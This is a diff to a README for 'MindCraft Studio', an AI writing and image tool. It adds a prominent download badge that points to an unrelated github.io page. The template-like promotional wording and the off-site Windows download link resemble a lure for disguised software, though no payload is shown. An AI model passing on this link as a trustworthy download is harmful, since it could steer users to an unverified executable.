@@ -30,6 +30,12 @@ MindCraft Studio combines a large-language model writing assistant with an AI im
 
 Whether you're a newcomer or a veteran, MindCraft Studio provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download MindCraft Studio](https://img.shields.io/badge/⬇_DOWNLOAD_MindCraft+Studio-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
